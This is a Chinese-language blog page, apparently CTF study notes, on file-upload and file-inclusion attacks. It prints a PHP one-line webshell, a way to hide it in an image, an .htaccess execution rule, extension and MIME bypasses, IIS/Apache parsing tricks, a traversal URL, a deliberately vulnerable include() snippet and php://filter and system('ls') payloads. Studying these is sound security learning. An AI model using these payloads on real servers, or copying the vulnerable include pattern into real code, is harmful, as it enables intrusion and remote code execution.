@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>文件上传 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="一句话木马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="http://yoursite.com/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一句话木马">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-01-15T02:28:05.000Z">
+<meta property="article:modified_time" content="2020-01-15T08:05:16.393Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/2.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Peguin</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Xss%E6%80%BB%E7%BB%93/" style="font-size: 10px;">Xss总结</a> <a href="/tags/climb/" style="font-size: 10px;">climb</a> <a href="/tags/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size: 10px;">linux常用命令</a> <a href="/tags/sql%E6%80%BB%E7%BB%93/" style="font-size: 10px;">sql总结</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">堆叠注入</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Peguin</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/2.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Peguin</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  	<time datetime="2020-01-15T02:28:05.000Z" itemprop="datePublished">2020-01-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件上传
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><a id="more"></a>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[fox])?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="图片一句话木马制作"><a href="#图片一句话木马制作" class="headerlink" title="图片一句话木马制作"></a>图片一句话木马制作</h4><p>cmd制作,进入图片所在目录，copy xx.jpg/b+xx.php/a newxx.jpg<br>winhex制作 在文本最后添加一句话木马，编码另存为新图片</p>
+<h4 id="关于文件格式解析："><a href="#关于文件格式解析：" class="headerlink" title="关于文件格式解析："></a>关于文件格式解析：</h4><p>每种类型的文件无法识别别的文件格式</p>
+<h4 id="js验证本地上传"><a href="#js验证本地上传" class="headerlink" title="js验证本地上传"></a>js验证本地上传</h4><p>1.js判断代码为:onsubmit = “return checkFile()”<br>2.增加允许上传的文件类型.php<br>3.拷贝源代码，删除判断代码，在action处指定上传路径<br>4.上传允许上传的代码，抓包改包</p>
+<h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过:"></a>MIME绕过:</h4><p>修改content-type字段可以上传指定的文件格式<br>文件拓展限制:<br>大小写绕过文件上传（widnows下文件不区分大小写 linux区分）<br>.空格绕过.php.,.php空格都解析为.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件代码:</span><br><span class="line">&lt;Filesmatch&quot;fox&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">把文件名为fox的文件全都以php运行(先上传.htaccess文件再上传文件)</span><br></pre></td></tr></table></figure>
+
+<h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><h4 id="Apache解析漏洞-读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1-php-xxx-1-php"><a href="#Apache解析漏洞-读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1-php-xxx-1-php" class="headerlink" title="Apache解析漏洞,读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1.php.xxx=1.php"></a>Apache解析漏洞,读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1.php.xxx=1.php</h4><h4 id="内容验证文件上传"><a href="#内容验证文件上传" class="headerlink" title="内容验证文件上传:"></a>内容验证文件上传:</h4><p>文件头上传绕过，在一句话木马php文件前面加上jpg，png，gif图片文件的开头可以绕过检测</p>
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断:"></a>%00截断:</h4><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当作结束符，可用于对文件类型名的绕过<br>get可以自动转换，post需要特殊转换（选中进行url格式转换）</p>
+<h4 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h4><p>1.目录解析<br>以<em>.asp命名的文件夹里的文件都会被当成asp文件执行<br>比如1.asp/1.jpg，1.jpg会被当做asp文件执行<br>2.文件解析<br>*.asp;.jpg在;后面的被直接忽略，当成</em>.asp文件执行</p>
+<h4 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞:"></a>编辑器漏洞:</h4><p>1.不需要后台验证直接可以进行操作(御剑扫描进行目标爆破)<br>2.需要后台管理登录才能够操作<br>常用的编辑器:FCKeditor,EWEbeditor,CKFinder,UEDITOR<br>FCKeditor:突破建立文件夹,实质是利用iis6的目录解析<br>EWEbeditor遍历漏洞<br>ewebeditor/admin_uploadfile.asp?id=14&amp;dir=../</p>
+<h4 id="iis7-0以上高版本漏洞"><a href="#iis7-0以上高版本漏洞" class="headerlink" title="iis7.0以上高版本漏洞"></a>iis7.0以上高版本漏洞</h4><p>1.jpg/.php，在1.jpg中写入一句话木马，因为.php不存在但是会用php来解析，就会读取1.jpg，这其中的一句话就会被执行</p>
+<h3 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)，            　　 文件头：89504E47 文件尾：0000000049454E44AE426082</span><br><span class="line">GIF (gif)，              　　文件头：47494638</span><br><span class="line">ZIP Archive (zip)，           文件头：504B0304 文件尾：00000000</span><br><span class="line">TIFF (tif)，              　  文件头：49492A00</span><br><span class="line">Windows Bitmap (bmp)，      文件头：424D</span><br><span class="line">CAD (dwg)，               文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，      文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，       文件头：7B5C727466</span><br><span class="line">XML (xml)，                文件头：3C3F786D6C</span><br><span class="line">HTML (html)，              文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，       文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，             文件头：2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)，    文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，           文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，          文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，        文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，             文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，     文件头：E3828596</span><br><span class="line">RAR Archive (rar)，           文件头：52617221</span><br><span class="line">Wave (wav)，               文件头：57415645</span><br><span class="line">AVI (avi)，                 文件头：41564920</span><br><span class="line">Real Audio (ram)，           文件头：2E7261FD</span><br><span class="line">Real Media (rm)，            文件头：2E524D46</span><br><span class="line">MPEG (mpg)，              文件头：000001BA</span><br><span class="line">MPEG (mpg)，              文件头：000001B3</span><br><span class="line">Quicktime (mov)，           文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，        文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，                文件头：4D546864</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="部分MIME表"><a href="#部分MIME表" class="headerlink" title="部分MIME表"></a>部分MIME表</h3><table>
+<thead>
+<tr>
+<th><code>.aac</code></th>
+<th align="center">AAC audio</th>
+<th><code>audio/aac</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.abw</code></td>
+<td align="center"><a href="https://en.wikipedia.org/wiki/AbiWord" target="_blank" rel="noopener">AbiWord</a> document</td>
+<td><code>application/x-abiword</code></td>
+</tr>
+<tr>
+<td><code>.arc</code></td>
+<td align="center">Archive document (multiple files embedded)</td>
+<td><code>application/x-freearc</code></td>
+</tr>
+<tr>
+<td><code>.avi</code></td>
+<td align="center">AVI: Audio Video Interleave</td>
+<td><code>video/x-msvideo</code></td>
+</tr>
+<tr>
+<td><code>.azw</code></td>
+<td align="center">Amazon Kindle eBook format</td>
+<td><code>application/vnd.amazon.ebook</code></td>
+</tr>
+<tr>
+<td><code>.bin</code></td>
+<td align="center">Any kind of binary data</td>
+<td><code>application/octet-stream</code></td>
+</tr>
+<tr>
+<td><code>.bmp</code></td>
+<td align="center">Windows OS/2 Bitmap Graphics</td>
+<td><code>image/bmp</code></td>
+</tr>
+<tr>
+<td><code>.bz</code></td>
+<td align="center">BZip archive</td>
+<td><code>application/x-bzip</code></td>
+</tr>
+<tr>
+<td><code>.bz2</code></td>
+<td align="center">BZip2 archive</td>
+<td><code>application/x-bzip2</code></td>
+</tr>
+<tr>
+<td><code>.csh</code></td>
+<td align="center">C-Shell script</td>
+<td><code>application/x-csh</code></td>
+</tr>
+<tr>
+<td><code>.css</code></td>
+<td align="center">Cascading Style Sheets (CSS)</td>
+<td><code>text/css</code></td>
+</tr>
+<tr>
+<td><code>.csv</code></td>
+<td align="center">Comma-separated values (CSV)</td>
+<td><code>text/csv</code></td>
+</tr>
+<tr>
+<td><code>.doc</code></td>
+<td align="center">Microsoft Word</td>
+<td><code>application/msword</code></td>
+</tr>
+<tr>
+<td><code>.docx</code></td>
+<td align="center">Microsoft Word (OpenXML)</td>
+<td><code>application/vnd.openxmlformats-officedocument.wordprocessingml.document</code></td>
+</tr>
+<tr>
+<td><code>.gif</code></td>
+<td align="center">Graphics Interchange Format (GIF)</td>
+<td><code>image/gif</code></td>
+</tr>
+<tr>
+<td><code>.htm.html</code></td>
+<td align="center">HyperText Markup Language (HTML)</td>
+<td><code>text/html</code></td>
+</tr>
+<tr>
+<td><code>.jpeg</code> <code>.jpg</code></td>
+<td align="center">JPEG images</td>
+<td><code>image/jpeg</code></td>
+</tr>
+<tr>
+<td><code>.js</code></td>
+<td align="center">JavaScript</td>
+<td><code>text/javascript</code></td>
+</tr>
+<tr>
+<td><code>.json</code></td>
+<td align="center">JSON format</td>
+<td><code>application/json</code></td>
+</tr>
+<tr>
+<td><code>.mp3</code></td>
+<td align="center">MP3 audio</td>
+<td><code>audio/mpeg</code></td>
+</tr>
+<tr>
+<td><code>.png</code></td>
+<td align="center">Portable Network Graphics</td>
+<td><code>image/png</code></td>
+</tr>
+<tr>
+<td><code>.pdf</code></td>
+<td align="center">Adobe <a href="https://acrobat.adobe.com/us/en/why-adobe/about-adobe-pdf.html" target="_blank" rel="noopener">Portable Document Format</a> (PDF)</td>
+<td><code>application/pdf</code></td>
+</tr>
+<tr>
+<td><code>.ppt</code></td>
+<td align="center">Microsoft PowerPoint</td>
+<td><code>application/vnd.ms-powerpoint</code></td>
+</tr>
+<tr>
+<td><code>.sh</code></td>
+<td align="center">Bourne shell script</td>
+<td><code>application/x-sh</code></td>
+</tr>
+<tr>
+<td><code>.svg</code></td>
+<td align="center">Scalable Vector Graphics (SVG)</td>
+<td><code>image/svg+xml</code></td>
+</tr>
+<tr>
+<td><code>tif.tiff</code></td>
+<td align="center">Tagged Image File Format (TIFF)</td>
+<td><code>image/tiff</code></td>
+</tr>
+<tr>
+<td><code>.txt</code></td>
+<td align="center">Text, (generally ASCII or ISO 8859-<em>n</em>)</td>
+<td><code>text/plain</code></td>
+</tr>
+<tr>
+<td><code>.xml</code></td>
+<td align="center"><code>XML</code></td>
+<td><code>application/xml</code> 代码对普通用户来说不可读 (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3) <code>text/xml</code> 代码对普通用户来说可读 (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3)</td>
+</tr>
+</tbody></table>
+<h4 id="后记：百度杯upload"><a href="#后记：百度杯upload" class="headerlink" title="后记：百度杯upload"></a>后记：百度杯upload</h4><p>为何可以直接上传后缀为 pht 或 phtml 绕过黑名单呢？</p>
+<p>php的conf文件中是有一个正则的后缀名限制的，只要符合都可以被当做php文件执行。</p>
+<p>符合的后缀包括 php、php3、php4、php5、phtml、pht 等。</p>
+<p>什么环境下可以解析 phtml 和 pht 呢？</p>
+<p>1，phpstudy和wamp以及centos用yum方式 安装的lamp环境不能解析phtml和pht</p>
+<p>2，ubuntu和debian利用apt-get方式安装的lamp环境 就能解析phtml和pht</p>
+<p>利用这些环境特性和黑名单就能绕过限制，达到上传webshell的目的。</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h4 id="php文件包含的形式"><a href="#php文件包含的形式" class="headerlink" title="php文件包含的形式"></a>php文件包含的形式</h4><p>&lt;?php<br>    $file = $_GET[‘file’];<br>    if(isset($file)){<br>    include(“$file”);<br>    //require();<br>    //require_once();<br>    //include_once();<br>    }else{<br>        echo “file fail”<br>    }</p>
+<h4 id="php中引发文件包含就漏洞的通常是以下四个函数："><a href="#php中引发文件包含就漏洞的通常是以下四个函数：" class="headerlink" title="php中引发文件包含就漏洞的通常是以下四个函数："></a>php中引发文件包含就漏洞的通常是以下四个函数：</h4><p>include()<br>include_once()<br>require()<br>require_once()<br>注：require()如果在包含过程中出错，比如文件不存在等，会直接退出不执行后续语句.<br>include()如果出错会提出警告，后续语句会继续执行<br>文件包含漏洞的场景:<br>1.具有相关的文件包含函数<br>2.文件包含函数中存在动态变量，比如include $file;.<br>3.攻击者能够控制该变量,比如$file = $_GET[‘file’];.</p>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h4><p>1.LFI(Local File Inclusion)<br>本地文件包含漏洞，指能打开并包含本地文件的漏洞，大部分情况下遇到的都是本地包含。<br>2.RFI(Remote File Inclusion)<br>远程文件包含漏洞，只能够包含远程服务器上的文件并执行，由于远程文件包含漏洞是我们可控的<br>，因此漏洞一旦存在危害就很大利用条件较为苛刻，需要PHP.INI中进行配置<br>1.allow_url_fopen = On<br>2.allow_url_include = On</p>
+<h3 id="做题过程遇到的补充"><a href="#做题过程遇到的补充" class="headerlink" title="做题过程遇到的补充:"></a>做题过程遇到的补充:</h3><p>可以爆出当前目录下的所有文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="actionscript">system(<span class="string">"ls"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>allow_url_include为On，用<a href="php://input">php://input</a>伪协议进行包含</p>
+<p>php://filter/read=convert.base64-encode/recource=index.php;</p>
+<p>这句话的意思是我们用base64编码的方式来读文件index.php；</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/01/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          逻辑漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/01/14/Xss/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Xss</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="文件上传" data-title="文件上传" data-url="http://yoursite.com/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"  data-images="/img/2.jpg" data-content="文件上传">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2020 Peguin
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
